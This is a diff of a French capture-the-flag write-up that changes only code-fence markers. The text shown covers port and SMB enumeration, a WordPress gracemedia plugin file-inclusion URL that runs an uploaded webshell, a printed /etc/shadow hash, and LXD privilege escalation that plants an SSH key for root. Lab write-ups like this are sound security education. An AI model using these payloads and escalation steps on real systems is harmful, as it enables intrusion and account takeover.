@@ -12,7 +12,7 @@ Un premier scan de ports renvoi des réponses ICMP bizarres comme quoi le protoc
 
 Pour savoir quels protocoles sont supportés par une machine distante on peut utiliser [un vieux code C que j'ai écrit il y a plus de 10 ans](http://devloop.users.sourceforge.net/index.php?article63/protoscan) ou plus facilement avec l'option *-sO* de Nmap.  
 
-```plain
+```
 $ sudo nmap -sO 192.168.56.2 
 Starting Nmap 7.92 ( https://nmap.org )
 Nmap scan report for 192.168.56.2
@@ -28,7 +28,7 @@ Etant donné qu'aucun port ne ressort non plus d'un scan UDP il est à parier qu
 
 Un import dans VMWare et un scan de port plus tard valident cette hypothèse :  
 
-```plain
+```
 Nmap scan report for 192.168.101.128
 Host is up (0.0014s latency).
 Not shown: 65530 closed tcp ports (reset)
@@ -52,7 +52,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Essayons de voir ce qui est disponible sur le Samba avec SMBmap :  
 
-```plain
+```
 $ python smbmap.py -H 192.168.101.128
 
     ________  ___      ___  _______   ___      ___       __         _______
@@ -71,7 +71,7 @@ $ python smbmap.py -H 192.168.101.128
 
 J'ai le bon réflexe d'essayer avec smbclient qui lui fonctionne correctement :  
 
-```plain
+```
 $ smbclient -U "" -N -L //192.168.101.128
 
         Sharename       Type      Comment
@@ -84,7 +84,7 @@ SMB1 disabled -- no workgroup available
 
 Une tentative d'accès au partage $print renvoie une erreur NT\_STATUS\_ACCESS\_DENIED mais le disque *welcome* est (évidemment) plus accueillant :  
 
-```plain
+```
 smb: \> ls
   .                                   D        0  Sat May  8 09:42:49 2021
   ..                                  D        0  Fri May  7 20:38:58 2021
@@ -102,7 +102,7 @@ smb: \> ls
 
 Avec, en ordre d'apparition, dans l'historique bash :  
 
-```plain
+```
 sudo su -
 ifconfig
 ls
@@ -116,7 +116,7 @@ chmod 755 jarves/
 
 et dans le fichier *something* :  
 
-```plain
+```
 I wanted to make it my home directory. But idea must be changed.
 
 Thanks,
@@ -142,7 +142,7 @@ Il y a aussi un CMS Gila que l'auteur a visiblement essayé d'installer sans suc
 
 Je passe donc sur WPscan :  
 
-```plain
+```
 $ docker run -it --rm wpscanteam/wpscan --url http://192.168.101.128/wp/
 _______________________________________________________________
          __          _______   _____
@@ -250,13 +250,13 @@ Il y a un plugin baptisé *gracemedia* en version 1.0. Il s'agit de la dernière
 
 On peut en profiter pour faire exécuter ce fameux shell :  
 
-```plain
+```
 /wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../home/jarves/upload/shell.php&cmd=id
 ```
 
 D'après l'output le fichier est inclus à deux reprises :  
 
-```plain
+```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -265,7 +265,7 @@ Je souhaiterais bien rapatrier un reverse shell mais le trafic sortant semble en
 
 Cela est validé avec le netcat présent sur la VM qui ne semble laisser passer que SSH :  
 
-```plain
+```
 $ nc -zv 192.168.101.1 1-500 -w 1
 --- snip ---
 nc: connect to 192.168.101.1 port 21 (tcp) timed out: Operation now in progress
@@ -298,7 +298,7 @@ Une particularité sur ce CTF est que selon le chemin employé (via le webshell 
 
 On obtient alors notre shell pour l'utilisateur *jarves* membre des groupes sudo et lxd.  
 
-```plain
+```
 uid=1000(jarves) gid=1000(jarves) groups=1000(jarves),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
 ```
 
@@ -308,7 +308,7 @@ On ne dispose pas du mot de passe de l'utilisateur et ce dernier n'est pas prés
 
 On remarque que certains process sont lancés via le démon CRON :  
 
-```plain
+```
 root         838  0.0  0.0   6884  3116 ?        Ss   08:50   0:00 /usr/sbin/cron -f -P
 root        1168  0.0  0.0   8412  3500 ?        S    08:51   0:00  _ /usr/sbin/CRON -f -P
 root        1171  0.0  0.0   2628   780 ?        Ss   08:51   0:00  |   _ /bin/sh -c bash /root/service
@@ -329,7 +329,7 @@ Et effectivement c'est le cas !
 
 Je peux par exemple lire la contab de root à l'adresse *http://192.168.101.128:10123/disk/var/spool/cron/crontabs/root* :  
 
-```plain
+```
 # m h  dom mon dow   command
 *2/ *   * * *   /usr/bin/python3  /usr/lib/hackerctf/sigma32.py
 *1/ *   * * *   bash /root/shell
@@ -338,7 +338,7 @@ Je peux par exemple lire la contab de root à l'adresse *http://192.168.101.128:
 
 J'ai aussi accès au contenu du fichir */etc/shadow* :  
 
-```plain
+```
 jarves:$6$bh9b6tMU.UIAzSq6$m6KFceXgSBAI/lnyIXVJK3t.5MnTRbU8zna08doU0OED53FgvXLo6vIzovX2TdXHPMPMAMtUFIZKAuriKfWCo1:18755:0:99999:7:::
 ```
 
@@ -348,7 +348,7 @@ Il ne reste qu'à procéder à une escalade de provilège par LXC. Je me suis in
 
 Le principe est similaire à une escalade via Docker : on va créer un container sur lequel on monte le disque hôte. On en profite pour placer notre clé publique SSH comme clé autorisée pour root :  
 
-```plain
+```
 jarves@hackerctflab:~$ lxd init
 Would you like to use LXD clustering? (yes/no) [default=no]: 
 Do you want to configure a new storage pool? (yes/no) [default=yes]: 
@@ -403,7 +403,7 @@ jarves@hackerctflab:~$ lxc exec ignite /bin/sh
 # cp ../../home/jarves/.ssh/authorized_keys .
 ```
 
-```plain
+```
 $ ssh root@192.168.1.5
 Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
 
